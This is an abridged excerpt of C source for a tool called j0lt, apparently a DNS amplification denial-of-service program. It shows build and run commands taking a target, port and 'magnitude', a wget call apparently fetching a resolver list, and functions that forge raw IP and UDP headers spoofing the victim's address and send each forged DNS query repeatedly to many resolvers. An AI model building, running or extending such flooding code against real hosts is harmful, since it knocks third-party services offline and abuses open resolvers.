 ...
 * (snowcra5h)-$ gcc j0lt.c -o j0lt
 * (snowcra5h)-$ sudo ./j0lt -t 127.0.0.1 -p 80 -m 1337
 * ------------------------------------------------------------
 * Options:
  ...
  do
    {
      switch (opt)
        ...
        default: /* '?' */
          err_exit (
              "Usage: ./j0lt -t target -p port -m magnitude [OPTION]...\n");
        }
    }
  ...
  if (filereadmode == false)
    {
      ...
      s = posix_spawnp (&child_pid, g_wget[0], file_actionsp, attrp,
                        &g_wget[0], environ);
      if (s != 0)
  ...
  while (magnitude >= 1)
    {
      ...
      while (nread
             = readline (lineptr, resolvptr, MAX_LINE_SZ_J0LT, szresolvlist)
               != 0)
        {
          resolvptr += nread;
          szresolvlist -= nread;
          ...
          szpayload = forge_j0lt_packet (payload, htonl (resolvip),
                                         htonl (spoofip), spoofport);
          if (debugmode == 0)
            {
              szpewpew = PEWPEW_J0LT;
              while (szpewpew-- > 0)
                send_payload ((uint8_t *)payload, resolvip,
                              htons (NS_DEFAULTPORT), szpayload);
            }
          if (hexmode == 1)
...
size_t
forge_j0lt_packet (char *payload, uint32_t resolvip, uint32_t spoofip,
                   uint16_t spoofport)
{
  const char *url = ".";
  ...
  status &= insert_dns_question ((void **)&curpos, &buflen, url, ns_t_ns,
                                 ns_c_in);
  ...
  status &= insert_ip_header (&curpos, &buflen, &pseudoheader, resolvip,
                              spoofip, udpsz);
...
bool
insert_dns_question (void **buf, size_t *buflen, const char *domain,
                     uint16_t query_type, uint16_t query_class)
{
  const char *token;
...
bool
insert_udp_header (uint8_t **buf, size_t *buflen, PSEUDOHDR *phdr,
                   const uint8_t *data, size_t ulen, uint16_t sport)
{
  bool status;
...
bool
insert_ip_header (uint8_t **buf, size_t *buflen, PSEUDOHDR *pheader,
                  uint32_t daddr, uint32_t saddr, size_t ulen)
{
  bool status;
  uint8_t *bufptr = *buf;
  ...
  checksum = j0lt_checksum ((const uint16_t *)bufptr,
                            (size_t)(IP_IHL_MIN_J0LT << 2));
  *buf -= 0xa;
...
bool
send_payload (const uint8_t *datagram, uint32_t daddr, uint16_t uh_dport,
              size_t nwritten)
{
  int raw_sockfd;
  ssize_t nread;
